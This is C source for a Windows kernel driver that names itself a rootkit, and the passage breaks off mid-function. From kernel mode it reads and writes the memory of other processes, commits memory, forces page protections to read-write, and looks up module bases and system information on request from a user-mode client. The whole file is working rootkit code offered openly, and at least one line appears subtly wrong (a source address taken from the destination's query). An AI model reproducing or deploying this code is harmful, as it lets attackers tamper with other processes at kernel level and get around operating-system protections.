#include "requests.h"


/*
====================================================================
====================================================================
MEMORY FUNCTIONS THAT CORRELATE TO ROOTKIT REQUESTS, SPECIFIC FUNCS:
====================================================================
====================================================================
*/




RKSYSTEM_INFORET GetModuleBaseRK(PEPROCESS Process, UNICODE_STRING ModuleName) {
	RKSYSTEM_INFORET ModuleBaseRet;
	DbgPrintEx(0, 0, "KMDFdriver MODULE BASE REQUEST\n");

	// Get process PEB for the base address -
	PPEB PrcPeb = PsGetProcessPeb(Process);
	if (!PrcPeb) {
		DbgPrintEx(0, 0, "KMDFdriver COULD NOT GET PROCESS PEB :(\n");
		ModuleBaseRet.Buffer = NULL;
		ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_PRCPEB;
		return ModuleBaseRet;
	}

	KAPC_STATE state;
	KeStackAttachProcess(Process, &state);  // Attach to the process
	PPEB_LDR_DATA PrcLdr = (PPEB_LDR_DATA)PrcPeb->Ldr;
	if (!PrcLdr) {
		KeUnstackDetachProcess(&state);  // Detach from the process
		DbgPrintEx(0, 0, "KMDFdriver NO LOADED MODULES AT ALL (LDR = NULL) :(\n");
		ModuleBaseRet.Buffer = NULL;
		ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_NOLOADEDDLLS;
		return ModuleBaseRet;
	}

	// Iterate the loader data to find the right module -
	for (PLIST_ENTRY list = (PLIST_ENTRY)PrcLdr->ModuleListLoadOrder.Flink; list != &PrcLdr->ModuleListLoadOrder; list = (PLIST_ENTRY)list->Flink) {
		PLDR_DATA_TABLE_ENTRY PrcEntry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
		if (RtlCompareUnicodeString(&PrcEntry->BaseDllName, &ModuleName, TRUE) == NULL) {
			ULONG64 BaseAddr = (ULONG64)PrcEntry->DllBase;  // Found process module (DLL) by its name in the process modules list
			KeUnstackDetachProcess(&state);  // Deattach from the process
			ModuleBaseRet.Buffer = (PVOID)1;
			ModuleBaseRet.BufferSize = BaseAddr;
			return ModuleBaseRet;
		}
	}
	KeUnstackDetachProcess(&state);  // Deattach from the process, did not work
	DbgPrintEx(0, 0, "KMDFdriver FAILED TO GET MODULE BASE :(\n");
	ModuleBaseRet.Buffer = NULL;
	ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_OTHER;
	return ModuleBaseRet;
}




NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST\n");

	PEPROCESS EpTo;
	PEPROCESS EpFrom;
	KAPC_STATE DstState;
	KAPC_STATE SrcState;
	MEMORY_BASIC_INFORMATION ToInfo = { 0 };
	MEMORY_BASIC_INFORMATION FromInfo = { 0 };
	NTSTATUS status;

	PVOID WriteToAddr = RootkInst->Out;
	PVOID WriteFromAddr = RootkInst->Buffer;
	ULONG64 WriteSize = RootkInst->Size;
	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
	SIZE_T AllocSize = ((WriteSize / PAGE_SIZE) + 1) * PAGE_SIZE;
	ULONG OldState = MEM_FREE;  // no importance for initial value
	BOOL WasCommitted = FALSE;
	BOOL CopyAttach = FALSE;  // FALSE = DST, TRUE = SRC
	PVOID SourceBuffer = NULL;
	PVOID TempBuffer = NULL;

	// Check for invalid arguments -
	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID ARGS SIZE (%zu)/SOURCE BUFFER (%p)/OUTPUT BUFFER (%p)\n", RootkInst->Size, RootkInst->Buffer, RootkInst->Out);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check for KM addresses (not allowed for this function) -
	if ((ULONG64)RootkInst->Out >= GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= GetHighestUserModeAddrADD()) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - ONE OR MORE OF THE BUFFERS ARE IN SYSTEMSPACE (SOURCE BUFFER (%p)/OUTPUT BUFFER (%p))\n", RootkInst->Buffer, RootkInst->Out);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Destination EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpTo))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET DESTINATION EPROCESS (%hu) :(\n", RootkInst->MainPID);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Source EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpFrom))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET SOURCE EPROCESS (%hu) :(\n", RootkInst->SemiPID);
		return ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SOURCE = (%s, %hu), DESTINATION = (%s, %hu)\n", RootkInst->MdlName, RootkInst->SemiPID, RootkInst->DstMdlName, RootkInst->MainPID);


	// Check if writing source can be read from (only when source = UM AND its not regular buffer, KM is always readable from here) -
	if (strcmp(RootkInst->MdlName, "regular") != 0) {
		KeStackAttachProcess(EpFrom, &SrcState);  // attach to the source process
		__try {
			ProbeForRead(WriteFromAddr, AllocSize, sizeof(UCHAR));
			status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
			KeUnstackDetachProcess(&SrcState);  // detach from the source process
			if (!NT_SUCCESS(status)) {
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT QUERY SOURCE VIRTUAL MEMORY TO VERIFY STATE\n");
				return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
			}
		}

		__except (STATUS_ACCESS_VIOLATION) {
			KeUnstackDetachProcess(&SrcState);  // detach from the source process
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY SOURCE OF WRITING\n");
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);

		}

		if (!(FromInfo.State & MEM_COMMIT)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE MEMORY REGION OF WRITING IS NOT COMMITTED IN MEMORY, CANNOT VERIFY IF WRITING FROM IT IS POSSIBLE\n");
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}

		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - CHECKING IF SOURCE ADDRESS NEEDS TO BE CHANGED OR NOT\n");
		if (FromInfo.AllocationBase == WriteFromAddr) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE ADDRESS DOES NOT NEED TO BE SWITCHED (%p, THE SAME AS FromInfo.AllocationBase)\n", WriteFromAddr);
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE ADDRESS SWITCHED FROM %p TO %p\n", WriteFromAddr, FromInfo.AllocationBase);
			WriteFromAddr = ToInfo.AllocationBase;
			RootkInst->Buffer = WriteFromAddr;
		}

		if (FromInfo.RegionSize < AllocSize) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - SOURCE MEMORY RANGE SIZE (%zu) < REQUIRED SIZE TO WRITE FROM (%zu)\n", FromInfo.RegionSize, AllocSize);
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UPDATE - SOURCE MEMORY RANGE SIZE (%zu) >= REQUIRED SIZE TO WRITE FROM (%zu)\n", FromInfo.RegionSize, AllocSize);
	}
	if (strcmp(RootkInst->MdlName, "regular") == 0) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST REG-UM\n");
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST UM-UM\n");
	}


	// Check if writing destination can be written into -
	// Query target address to check memory address range state (committed, reserved, free..) -
	KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
	__try {
		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
		status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
	}
	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY FST\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!NT_SUCCESS(status)) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - QUERY VIRTUAL MEMORY FAILED\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
	}


	OldState = ToInfo.State;
	if (((ULONG64)ToInfo.BaseAddress + ToInfo.RegionSize) < ((ULONG64)WriteToAddr + WriteSize)) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - WRONG SIZE + OUTPUT ADDRESS\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!(ToInfo.State & MEM_COMMIT)) {
		WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, ToInfo.AllocationBase, ZeroBits);
		if (WriteToAddr == NULL) {
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT COMMIT / NOT COMMITTED\n");
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}
		WasCommitted = TRUE;
	}
	else {
		if (AllocSize <= ToInfo.RegionSize) {
			DbgPrintEx(0, 0, "KMDFdriver WRITE REQUEST MEMORY AREA IS ALREADY COMMITTED WITH VALID SIZES (ALLOCBASE: %p, REGNSIZE: %zu, WRITESIZE: %zu)\n", ToInfo.AllocationBase, ToInfo.RegionSize, WriteSize);
			WriteToAddr = ToInfo.AllocationBase;
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver WRITE REQUEST MEMORY AREA IS ALREADY COMMITTED BUT INVALID SIZES (REGNSIZE: %zu, WRITESIZE: %zu)\n", ToInfo.RegionSize, WriteSize);
			status = ZwFreeVirtualMemory(ZwCurrentProcess(), &ToInfo.AllocationBase, &ToInfo.RegionSize, MEM_RELEASE);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(&DstState);  // detach from the destination process
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT RELEASE ALREADY MISMATCHING COMMITTED AREA\n");
				return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
			}

			WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
			if (WriteToAddr == NULL) {
				KeUnstackDetachProcess(&DstState);  // detach from the destination process
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT COMMIT / NOT COMMITTED NEW COMMITEMENT\n");
				return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
			}
			WasCommitted = TRUE;
			OldState = MEM_COMMIT;
		}
	}
	KeUnstackDetachProcess(&DstState);  // detach from the destination process
	RootkInst->Out = WriteToAddr;  // NOT INSIDE - C00..5 BECAUSE OF ATTACHING TO PROCESS


	// Query target address to check memory address range protection settings (access to memory) -
	KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
	status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);

	if (!NT_SUCCESS(status)) {
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		if (WasCommitted) {
			FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}

		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - QUERY VIRTUAL MEMORY FAILED\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!(ToInfo.Protect & PAGE_EXECUTE_READWRITE || ToInfo.Protect & PAGE_READWRITE || ToInfo.Protect & PAGE_WRITECOPY || ToInfo.Protect & PAGE_EXECUTE_WRITECOPY) || ToInfo.Protect & PAGE_GUARD || ToInfo.Protect & PAGE_NOACCESS) {
		if (!ChangeProtectionSettingsADD(ZwCurrentProcess(), WriteToAddr, (ULONG)AllocSize, PAGE_READWRITE, ToInfo.Protect)) {
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
			if (WasCommitted) {
				FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
			}

			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DO NOT HAVE WRITE PERMISSIONS\n");
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOWRITEPRMS, STATUS_UNSUCCESSFUL, RootkInst);
		}
	}
	KeUnstackDetachProcess(&DstState);  // detach from the destination process


	// Copy virtual memory (r/u-u) -
	__try {
		KeStackAttachProcess(EpTo, &DstState);  // attach to destination process
		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
		KeUnstackDetachProcess(&DstState);  // detach from the destination process

		KeStackAttachProcess(EpFrom, &SrcState);  // attach to source process
		CopyAttach = TRUE;
		ProbeForRead(WriteFromAddr, WriteSize, sizeof(UCHAR));
		KeUnstackDetachProcess(&SrcState);  // detach from the source process
		CopyAttach = FALSE;
	}

	__except (STATUS_ACCESS_VIOLATION) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT WRITEABLE FOR MMCOPYVIRTUALMEMORY\n");
		if (CopyAttach) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DETACHING FROM SOURCE PROCESS..\n");
			KeUnstackDetachProcess(&SrcState);  // detach from the source process
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DETACHING FROM DESTINATION PROCESS..\n");
			KeUnstackDetachProcess(&DstState);  // detach from the destination process
		}

		if (WasCommitted) {
			FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);

	}


	// Get the source buffer into kernel mode -
	SourceBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, WriteSize, 0x45674567);
	if (SourceBuffer == NULL) {
		if (WasCommitted) {
			FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT ALLOCATE KERNEL MODE BUFFER TO GET USERMODE SOURCE BUFFER\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}

	status = UserToKernelMEM(EpFrom, WriteFromAddr, SourceBuffer, WriteSize, FALSE);
	if (!NT_SUCCESS(status)) {
		if (WasCommitted) {
			FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET USERMODE SOURCE BUFFER INTO KERNEL MODE SOURCE BUFFER\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}

	// Print source usermode buffer value (as a string) to verify UM-KM -
	TempBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, WriteSize, 0x76547654);
	if (TempBuffer != NULL) {
		RtlCopyMemory(TempBuffer, SourceBuffer, WriteSize);
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCCEEDED GETTING SOURCE USERMODE BUFFER INTO KERNELMODE (%s)\n", (char*)TempBuffer);
		ExFreePool(TempBuffer);
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCCEEDED GETTING SOURCE USERMODE BUFFER INTO KERNELMODE, CANNOT ALLOCATE MEMORY FOR PRINTING BUFFER\n");
	}


	// Copying from UM-UM/REG-UM -
	status = KernelToUserMEM(EpTo, SourceBuffer, WriteToAddr, WriteSize, FALSE);
	if (WasCommitted) {
		FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
	}
	ExFreePool(SourceBuffer);

	if (!NT_SUCCESS(status)) {
		if (strcmp(RootkInst->MdlName, "regular") != 0) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - GetKernelToUser FAILED WHEN COPYING FROM REG-UM\n");
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - GetKernelToUser FAILED WHEN COPYING FROM KM-UM/UM-UM\n");
		}
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (strcmp(RootkInst->MdlName, "regular") != 0) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCEEDED (GetKernelToUser, KM-UM/UM-UM)\n");
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCEEDED (GetKernelToUser, REG-UM)\n");
	}

	return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST\n");

	PEPROCESS EpFrom;
	PEPROCESS EpTo;
	NTSTATUS status;
	KAPC_STATE SrcState;
	MEMORY_BASIC_INFORMATION FromInfo = { 0 };

	PVOID ReadToAddr = RootkInst->Out;
	PVOID ReadFromAddr = RootkInst->Buffer;
	ULONG64 ReadSize = RootkInst->Size;
	SIZE_T AllocSize = ((ReadSize / PAGE_SIZE) + 1) * PAGE_SIZE;
	PVOID SourceBuffer = NULL;
	PVOID TempBuffer = NULL;

	// Check for invalid arguments -
	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID ARGS SIZE (%zu)/SOURCE BUFFER (%p)/OUTPUT BUFFER (%p)\n", RootkInst->Size, RootkInst->Buffer, RootkInst->Out);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check for KM addresses (not allowed for this function) -
	if ((ULONG64)RootkInst->Out >= GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= GetHighestUserModeAddrADD()) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - ONE OR MORE OF THE BUFFERS ARE IN SYSTEMSPACE (SOURCE BUFFER (%p)/OUTPUT BUFFER (%p))\n", RootkInst->Buffer, RootkInst->Out);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Get destination process EPROCESS to write into it -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpTo))) {
		DbgPrintEx(0, 0, "KMDFdriver BEFORE READ REQUEST FROM USER MODE - CANNOT GET READING DESTINATION EPROCESS (%hu)\n", RootkInst->SemiPID);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
	}

	// source process EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpFrom))) {
		DbgPrintEx(0, 0, "KMDFdriver BEFORE READ REQUEST FROM USER MODE - CANNOT GET READING SOURCE EPROCESS (%hu)\n", RootkInst->MainPID);
		return ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver PERFORMING READ REQUEST FROM USER MODE\n");


	// Verify the source address and the memory region -
	__try {
		KeStackAttachProcess(EpFrom, &SrcState);  // attach to the source process
		ProbeForRead(ReadFromAddr, AllocSize, sizeof(UCHAR));
		status = ZwQueryVirtualMemory(ZwCurrentProcess(), ReadFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(&SrcState);
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - CANNOT QUERY TO VERIFY SOURCE\n");
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
		}
		KeUnstackDetachProcess(&SrcState);  // detach from the source buffer

		if (!(FromInfo.State & MEM_COMMIT)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE MEMORY REGION IS NOT COMMITTED, NOTHING TO READ\n");
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// If reading parameters are out of range: use allocation base -
		if ((ULONG64)ReadFromAddr + ReadSize > (ULONG64)FromInfo.AllocationBase + FromInfo.RegionSize) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - CHANGING READING ADDRESS FROM %p TO %p (ReadFromAddr + ReadSize IS OUT OF RANGE OF REGION)\n", ReadFromAddr, FromInfo.AllocationBase);
			ReadFromAddr = FromInfo.AllocationBase;
		}
		RootkInst->Buffer = ReadFromAddr;

		if (FromInfo.RegionSize < AllocSize) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE MEMORY REGION SIZE (%zu) < REQUESTED SIZE (%zu)\n", FromInfo.RegionSize, AllocSize);
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// Allocate source buffer -
		SourceBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, ReadSize, 0X45674567);
		if (SourceBuffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - LOCAL KERNELMODE SOURCE BUFFER = NULL\n");
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// Get source buffer -
		status = UserToKernelMEM(EpFrom, ReadFromAddr, SourceBuffer, ReadSize, FALSE);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - COPYING SOURCE USERMODE TO KERNELMODE LOCAL BUFFER FAILED\n");
			ExFreePool(SourceBuffer);
			return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
		}

		// Try to verify the passing of the right values -
		TempBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, ReadSize, 0x76547654);
		if (TempBuffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - CANNOT ALLOCATE MEMORY FOR VERIFICATION TEMPORARY BUFFER\n");
		}
		else {
			RtlCopyMemory(TempBuffer, SourceBuffer, ReadSize);
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - VERIFICATION TEMPORARY BUFFER VALUE: %s\n", (char*)TempBuffer);
			ExFreePool(TempBuffer);
		}
	}
	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(&SrcState);
		if (SourceBuffer != NULL) {
			ExFreePool(SourceBuffer);
		}
		if (TempBuffer != NULL) {
			ExFreePool(TempBuffer);
		}
		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Copy from local KM buffer to the destination UM buffer -
	status = KernelToUserMEM(EpTo, SourceBuffer, ReadToAddr, ReadSize, FALSE);
	ExFreePool(SourceBuffer);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - GetKernelToUser FAILED\n");
		return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}

	DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST SUCCEEDED - GetKernelToUser SUCCEEDED\n");
	return ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




void PrintDbgMsgRK(const char* Message)
{
	DbgPrintEx(0, 0, "KMDFdriver PRINT MESSAGE REQUEST\n");
	DbgPrintEx(0, 0, "KMDFdriver Message: %s\n", Message);
}




ROOTKIT_STATUS RetSystemInfoRK(PVOID DstBuffer, PVOID SrcBuffer, ULONG BufferSize, DWORD RequestNum) {
	DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION REQUEST NUMBER %u\n", RequestNum);

	// Copy the data from the information's buffer into the buffer supposed to be returned to ActClient -
	NTSTATUS CopyResult = MmCopyVirtualMemory(PsGetCurrentProcess(), SrcBuffer, PsGetCurrentProcess(), DstBuffer, BufferSize, KernelMode, NULL);
	if (!NT_SUCCESS(CopyResult)) {
		DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION REQUEST NUMBER %u FAILED COPYING WITH MmCopyVirtualMemory()\n", RequestNum);
		return ROOTKSTATUS_COPYFAIL;

	}
	ExFreePool(SrcBuffer);
	DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION REQUEST NUMBER %u SUCCEEDED COPYING WITH MmCopyVirtualMemory()\n", RequestNum);
	return ROOTKSTATUS_SUCCESS;
}




RKSYSTEM_INFORET RequestSystemInfoRK(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum) {
	NTSTATUS status;
	PVOID Buffer = NULL;
	ULONG BufferSizeInc = 1024;
	ULONG InitBufferSize = 1024;
	ULONG BufferSize;
	RKSYSTEM_INFORET SysInfoRet = { 0 };
	DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST NUMBER %u\n", SysInfNum);
	DbgPrintEx(0, 0, "KMDFdriver RequestSysteminfo REQUESTED INFO TYPE - %u\n", InfoType);

	while (InitBufferSize <= 0xFFFFFFFF) {
		DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST TRYING WITH BUFFER SIZE OF %u..\n", InitBufferSize);

		// Allocate an inital buffer -
		Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, InitBufferSize, (ULONG)Flag);
		if (!Buffer) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST COULD NOT ALLOCATE MEMORY (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_MEMALLOC;
			return SysInfoRet;
		}

		// Query the required buffer size -
		status = ZwQuerySystemInformation(InfoType, Buffer, InitBufferSize, &BufferSize);
		if (NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST SUCCEEDED FIRST TRY (INITIAL=%u,ACTUAL=%u)\n", InitBufferSize, BufferSize);
			SysInfoRet.BufferSize = BufferSize;
			SysInfoRet.Buffer = Buffer;
			return SysInfoRet;
		}

